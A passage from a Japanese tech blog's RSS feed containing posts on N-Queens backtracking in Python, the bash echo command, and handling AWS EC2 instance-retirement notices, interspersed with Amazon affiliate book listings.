&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>第6回 pythonでNQueen（エイトクイーン）バックトラック（２）</title><link>https://suzukiiichiro.github.io/posts/2022-02-08-01-ani/</link><pubDate>Wed, 09 Feb 2022 12:55:55 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-08-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-08-01-ani/chess.jpg" alt="Featured image of post 第6回 pythonでNQueen（エイトクイーン）バックトラック（２）" />&lt;h2 id="mainメソッド概要">mainメソッド概要&lt;/h2>
&lt;p>今回は前回から引き続きバックトラックを説明していきたいと思います。&lt;/p>
&lt;p>プログラムソースは以下のURLにあります。&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py" target="_blank" rel="noopener"
>https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py&lt;/a>&lt;/p>
&lt;p>429-437行目でグローバル変数を宣言した後に呼び出されるのは486行目のmainメソッドです。&lt;br>
467-484行目のmainメソッドの内容を見てみましょう。 &lt;br>
nmin=4からMAX=15まで複数のNについて探索し、解の数と実行時間を出力します。&lt;br>
以下が出力結果です。&lt;/p>
&lt;pre tabindex="0">&lt;code>N: Total Unique hh:mm:ss.ms
4: 2 0 0:00:00.000
5: 10 0 0:00:00.000
6: 4 0 0:00:00.000
7: 40 0 0:00:00.001
8: 92 0 0:00:00.004
9: 352 0 0:00:00.019
10: 724 0 0:00:00.088
11: 2680 0 0:00:00.439
12: 14200 0 0:00:02.345
13: 73712 0 0:00:13.412
14: 365596 0 0:01:21.331
&lt;/code>&lt;/pre>&lt;p>NがNQueenのN数、Totalが解の総数、Uniqueは左右反転ミラー、回転で同じ形のものを同一解として計算した場合の数、&lt;br>
hh:mm:ss.msは各Nごとに処理にかかった時間です。&lt;br>
Uniqueは今回は全て0ですがロジックが進んでいくとまずUnique数を算出してそこからTotalを求めるようになりますので今の所は流しておいてください。&lt;br>
エイトクイーン(N=8)の解の数は8: の92、実行時間は4msとなります。&lt;br>
ブルートフォースが3m7.321s、配置フラグが0m0.554sでしたから格段に高速になったことがわかると思います。&lt;/p>
&lt;h2 id="mainメソッド詳細">mainメソッド詳細&lt;/h2>
&lt;p>メソッドの中身を見ていきましょう。&lt;br>
459行目 nmin=4 でスタートするNの数を指定しています。&lt;/p>
&lt;p>461行目 for i in range(nmin,MAX): でnmin=4からMAX=15まで1ずつインクリメントしてnqueenを実行していきます。&lt;/p>
&lt;p>462,463行目でfor文の冒頭でTOTAL,UNIQUEを0で初期化しています。 &lt;br>
これをしとかないと出力されるTotal,Uniqueの数が累計数になってしまいますので注意しましょう。&lt;/p>
&lt;p>464,465行目でABOARD配列を初期化しています。ABOARD配列は各行のどこにクイーンを置いたかを記憶するための配列です。ロジックが進んでいくと必須の配列になるのですが、今回のロジックでは使用しませんので読み飛ばしてください。&lt;/p>
&lt;p>467行目でnqueenメソッドを呼び出しています。&lt;br>
今までは引数はrow=0の行情報1つだけでしたが、今回から複数のNについてNqueenを実行するようになるので第2引数にsizeが追加されています。&lt;br>
sizeは461行目のfor i in range(nmin,MAX)のiで渡します。&lt;/p>
&lt;p>466行目,468-470行目でnqueenメソッドの前後時間を計測してメソッドの実行にかかった時間を算出しています。&lt;/p>
&lt;p>datetime.now()で現在時刻が取得できます。&lt;br>
466行目でstart_timeにnqueenメソッド呼び出し直前の時間を取得しておき、&lt;br>
468行目でメソッド終了直後の現在時刻とstart_timeを引くことによってメソッドの実行にかかった時間をtime_elapsedとして算出しています。&lt;/p>
&lt;p>469行目で'{}'.format としていますがこれはtime_elapsedがdatetimeオブジェクトなのでstringにキャストしています。&lt;br>
format関数は、文字列中の{ }の場所に、引数をにstringキャストして埋め込むことができるみたいです。&lt;/p>
&lt;p>470行目で下３桁を切り捨てています。&lt;br>
stringは配列の扱いなのでスライスできるみたいです&lt;br>
[:-3]&lt;br>
ですと、0文字目から後ろから3文字除いた範囲を取り出しています。&lt;br>
例えば以下のようになります。&lt;br>
0:00:00.005309&lt;br>
0:00:00.005&lt;/p>
&lt;p>基本的にformat関数は、文字列中の「{ }」の場所に、引数をstringにキャストして埋め込む&lt;br>
text = _text[:-3] スライス機能　先頭から末尾3文字を除いた文字列を切り取る&lt;/p>
&lt;h2 id="nqueenメソッドについて">nqueenメソッドについて&lt;/h2>
&lt;p>プログラムの内容は基本的に前回の配置フラグと同じです。&lt;br>
違うのは以下の2点です。&lt;/p>
&lt;p>1つ目は450,451,453行目です。&lt;br>
前回は配置フラグとして上下の利き筋だけチェックするFAだけ使っていました。&lt;br>
今回は、FAの他に左対角線の利き筋をチェックするFB、右対角線の利き筋をチェックするFCも使用しています。&lt;/p>
&lt;p>2つ目445行目です。&lt;br>
前回までは最終行まで行ったらprintOutメソッドでCOUNT数と各行のクイーンの配置場所を出力していました。&lt;br>
今回はTOTAL +=1 として正解数に1加算しています。&lt;br>
FA,FB,FCの配置フラグのチェックを通過して最終行まで辿り着ければ正解としてカウントして良いと言えるからです。&lt;/p>
&lt;p>次回は図で説明しながら実際の動きを追ってみましょう。&lt;/p></description></item><item><title>（１）【echo】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-09-01-echo-suzki/</link><pubDate>Wed, 09 Feb 2022 11:32:07 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-09-01-echo-suzki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-echo-suzki/bash.jpg" alt="Featured image of post （１）【echo】シェルスクリプトコマンド活用紹介" />&lt;h2 id="echoコマンド">echoコマンド&lt;/h2>
&lt;ul>
&lt;li>メッセージや環境変数を表示します。&lt;/li>
&lt;/ul>
&lt;h2 id="概要">概要&lt;/h2>
&lt;p>「echo」はメッセージなどを表示するコマンドです。&lt;/p>
&lt;pre tabindex="0">&lt;code>$echo メッセージ
&lt;/code>&lt;/pre>&lt;p>でメッセージを表示します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ echo $変数名
&lt;/code>&lt;/pre>&lt;p>で環境変数やシェルスクリプト内の変数を表示する際にも使用います。&lt;/p>
&lt;h2 id="echoコマンドの書式">echoコマンドの書式&lt;/h2>
&lt;p>echo [オプション] メッセージ&lt;/p>
&lt;h2 id="echoの主なオプション">echoの主なオプション&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">オプション&lt;/th>
&lt;th>意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">-n&lt;/td>
&lt;td>最後の改行を出力しない&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-e&lt;/td>
&lt;td>エスケープを解釈する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-E&lt;/td>
&lt;td>エスケープを解釈しない（デフォルト）&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="echo-コマンド詳細説明">echo コマンド詳細説明&lt;/h3>
&lt;p>&lt;font color=orange>&lt;b> echoコマンドの使用：&lt;/b>&lt;/font>&lt;br>
さまざまなオプションでechoコマンドを使用できます。&lt;br>
次の例では、いくつかの便利なオプションについて説明します。&lt;br>
オプションなしで「echo」コマンドを使用すると、デフォルトで改行が追加されます。&lt;br>
&amp;lsquo;-n&amp;rsquo;オプションは、改行なしでテキストを印刷するために使用されます。&lt;br>
&amp;lsquo;-e&amp;rsquo;オプションは、出力からバックスラッシュ文字を削除するために使用されます。&lt;br>
&amp;lsquo;echo_example.sh&amp;rsquo;という名前の新しいbashファイルを作成し、次のスクリプトを追加します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:echo_example.sh" data-lang="bash:echo_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;改行付きのテキストの印刷&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> -n &lt;span class="s2">&amp;#34;改行なしのテキストの印刷&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> -e &lt;span class="s2">&amp;#34;\n削除\tバックスラッシュ\t文字\n&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash echo_example.sh
改行付きのテキストの印刷
改行なしのテキストの印刷
削除 バックスラッシュ 文字
$
&lt;/code>&lt;/pre>&lt;h3 id="hello-world">Hello World&lt;/h3>
&lt;p>&lt;font color=orange>&lt;b>はじめてのbashコマンド「echo」&lt;/b>&lt;/font>&lt;br>
ターミナルで非常に単純なbashステートメントを実行します。 コマンドの出力は「Hello, World」になります。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-:はじめてのecho" data-lang=":はじめてのecho">$ echo &amp;quot;Hello, World&amp;quot;;
Hello, World
$
&lt;/code>&lt;/pre>&lt;p>はじめてのbashスクリプト「vim」&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash:はじめてのbashスクリプト" data-lang="bash:はじめてのbashスクリプト">$ vim HelloWorld.sh
＜空のvim HelloWorld.sh が開きます＞
&lt;/code>&lt;/pre>&lt;p>vimで開いたHelloWorld.shを編集します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:HelloWorld.sh" data-lang="bash:HelloWorld.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello World&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>echo の後ろに続く文字列は 「&amp;quot;&amp;quot;」（ダブるクォーテーション）または、「''」（シングルクォーテーション）で囲みましょう。&lt;/dd>
&lt;dd>行末の「;」（セミコロン）も忘れずに。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>Amazon EC2 Instance Retirementとメールが来たときの対応</title><link>https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/</link><pubDate>Tue, 08 Feb 2022 09:39:37 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/catch.jpg" alt="Featured image of post Amazon EC2 Instance Retirementとメールが来たときの対応" />&lt;p>みなさんの中にもAWSのEC2を使った事がある人もいるかと思います。&lt;br>
そのAWSからある日、下記のようなメールが届きました。&lt;/p>
&lt;blockquote>
&lt;p>Hello,&lt;/p>
&lt;p>EC2 has detected degradation of the underlying hardware hosting your Amazon EC2 instance (instance-ID: [インスタンスのID]) associated with your AWS account (AWS Account ID: [ID]) in the [リージョンの場所] region.&lt;br>
Due to this degradation your instance could already be unreachable.&lt;br>
We will stop your instance after 日付 UTC.&lt;br>
Please take appropriate action before this time.&lt;/p>
&lt;p>The affected instances are listed below:&lt;/p>
&lt;p>[インスタンスのID]&lt;/p>
&lt;/blockquote>
&lt;p>翻訳してみると、どうやらAWSの老朽化に伴うインスタンスの更新が必要なようです。&lt;/p>
&lt;blockquote>
&lt;p>こんにちは。&lt;/p>
&lt;p>EC2は、[リージョンの場所]リージョンにあるお客様のAWSアカウント（AWSアカウントID：[ID]）に関連するAmazon EC2インスタンス（インスタンスID：Instance-ID）をホストする基礎ハードウェアの劣化を検出しました。&lt;br>
この劣化により、お客様のインスタンスはすでに到達不能になっている可能性があります。日付 UTC以降にお客様のインスタンスを停止します。&lt;br>
それまでに適切な対処をお願いいたします。&lt;/p>
&lt;p>影響を受けるインスタンスは以下の通りです。&lt;br>
[インスタンスのID]&lt;/p>
&lt;/blockquote>
&lt;p>老朽化の通知をしてくれるのは非常にありがたいですが、EC2の適切な対処ってなんだ？と焦ってしまう方もいるかと思います。&lt;br>
今回は「Amazon EC2 Instance Retirement」というタイトルのメールが来た際の対処法について説明いたします。&lt;/p>
&lt;h2 id="ec2のイベントを確認">EC2のイベントを確認&lt;/h2>
&lt;p>まずはAWSにログインして、EC2の項目に移動します。&lt;br>
左袖に、「&lt;strong>イベント&lt;/strong>」という項目があるので、クリックして内容を確認しましょう。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 148;
flex-basis: 356px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img01.png" data-size="980x660">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img01.png"
width="980"
height="660"
loading="lazy"
alt="Amazon EC2 Instance Retirementとメールが来たときの対応の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>今回は「イベントステータス」部分に「Scheduled」と記述され、「イベントタイプ」が「instance-stop」となっている項目がありました。&lt;br>
リソースIDをAWSのメールと照らし合わせて、該当のインスタンスということがわかります。&lt;/p>
&lt;p>「説明」の部分にも見切れていますが、「The instance is running on degraded hardware（インスタンスが劣化したハードウェアで動作している）」と記述されていました。&lt;br>
進行状況から14日以内にインスタンスが停止してしまうので、「Amazon EC2 Instance Retirement」というメールが来たら、早めにAWSへログインして状況を確認するようにしましょう。&lt;/p>
&lt;h2 id="ec2のルートを確認">EC2のルートを確認&lt;/h2>
&lt;p>次に、該当のインスタンスの&lt;strong>ルートデバイスタイプ&lt;/strong>を確認します。&lt;br>
前回のリソースID部分をクリックして、「インスタンスの概要」へ移動します。そして、「ストレージ」をクリックして「ルートデバイスタイプ」を確認しましょう。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 535;
flex-basis: 1285px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img02.png" data-size="980x183">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img02.png"
width="980"
height="183"
loading="lazy"
alt="Amazon EC2 Instance Retirementとメールが来たときの対応の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>この部分が「&lt;strong>EBS&lt;/strong>」となっている場合は、対応が非常に簡単です。&lt;br>
その対応を方法は次のようになります。&lt;/p>
&lt;h2 id="ec2を停止そして起動">EC2を停止、そして起動&lt;/h2>
&lt;p>「Amazon EC2 Instance Retirement」の対応はルートデバイスがEBSの場合は、対象のインスタンスを一度「&lt;strong>インスタンスを停止&lt;/strong>」させてから「&lt;strong>インスタンスを開始&lt;/strong>」するだけで対応できてしまいます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 250;
flex-basis: 601px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img03.png" data-size="980x391">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img03.png"
width="980"
height="391"
loading="lazy"
alt="Amazon EC2 Instance Retirementとメールが来たときの対応の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>「インスタンスを停止」して「インスタンスを開始」だから、要するに「インスタンスを再起動」ってことでしょ？と考えてしまうかもしれません。&lt;br>
しかし、「インスタンスを再起動」の場合はEC2のハードウェアが変わらないため、今回のハードウェアのアップデートが行われません。&lt;br>
ですので、「インスタンスを停止」させてから「インスタンスを開始」するようにして、EC2を実行するハードウェアをAWS側が自動的に変更するようにしましょう。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 335;
flex-basis: 805px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img04.png" data-size="980x292">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img04.png"
width="980"
height="292"
loading="lazy"
alt="Amazon EC2 Instance Retirementとメールが来たときの対応の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ルートデバイスタイプが「instant store」の場合&lt;/dt>
&lt;dd>ルートデバイスが「instant store」の場合はEBSと対応が変わります。
&lt;ol>
&lt;li>まず、EC2インスタンスからイメージを作成します。&lt;/li>
&lt;li>次に、さきほど作成したイメージを利用し、別のEC2インスタンスを立ち上げます。&lt;/li>
&lt;li>そして、元のEC2インスタンスを削除します&lt;/li>
&lt;/ol>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>「Amazon EC2 Instance Retirement」というメールが来た場合、焦らずに対応できるようにしておきましょう。&lt;br>
EBSの場合は「&lt;strong>インスタンスを停止&lt;/strong>」させてから「&lt;strong>インスタンスを開始&lt;/strong>」。&lt;br>
instant storeの場合は、イメージを作成して、立ち上げて該当インスタンスを削除。&lt;br>
これさえ覚えておけば、大丈夫です。&lt;/p>
&lt;h2 id="おすすめの書籍">おすすめの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e5%9b%b3%e8%a7%a3%e5%8d%b3%e6%88%a6%e5%8a%9b-Amazon-Web-Services%e3%81%ae%e3%81%97%e3%81%8f%e3%81%bf%e3%81%a8%e6%8a%80%e8%a1%93%e3%81%8c%e3%81%93%e3%82%8c1%e5%86%8a%e3%81%a7%e3%81%97%e3%81%a3%e3%81%8b%e3%82%8a%e3%82%8f%e3%81%8b%e3%82%8b%e6%95%99%e7%a7%91%e6%9b%b8-%e5%b0%8f%e7%ac%a0%e5%8e%9f/dp/4297108895/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51AEyJOSYaL.jpg" alt=" 図解即戦力 Amazon Web Servicesのしくみと技術がこれ1冊でしっかりわかる教科書 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> 図解即戦力 Amazon Web Servicesのしくみと技術がこれ1冊でしっかりわかる教科書 &lt;/h2>
&lt;p> 【「ITエンジニア本大賞2021」技術書部門 入賞! 】 Amazon Web Servicesのしくみがすぐにわかる! Amazon Web Services(AWS)のしくみや関連技術についてわかりやすく解説する図解本です。エンジニア1年生、IT業界などへの転職・就職を目指す人が、AWS関連の用語、しくみ、クラウドとネットワークの基礎技術などを一通り学ぶことのできる、1冊目の入門書としてふさわしい内容を目指します。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e8%a6%81%e7%82%b9%e6%95%b4%e7%90%86%e3%81%8b%e3%82%89%e6%94%bb%e7%95%a5%e3%81%99%e3%82%8b%e3%80%8eAWS%e8%aa%8d%e5%ae%9a-%e3%83%87%e3%83%bc%e3%82%bf%e3%83%99%e3%83%bc%e3%82%b9-%e5%b0%82%e9%96%80%e7%9f%a5%e8%ad%98%e3%80%8f-Compass-Books%e3%82%b7%e3%83%aa%e3%83%bc%e3%82%ba-NRI%e3%83%8d%e3%83%83%e3%83%88%e3%82%b3%e3%83%a0%e6%a0%aa%e5%bc%8f%e4%bc%9a%e7%a4%be/dp/4839975078/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51svKeJL9KS.jpg" alt=" 要点整理から攻略する『AWS認定 データベース-専門知識』 (Compass Booksシリーズ) ">
&lt;/div>
&lt;div class="columns amazon-info">
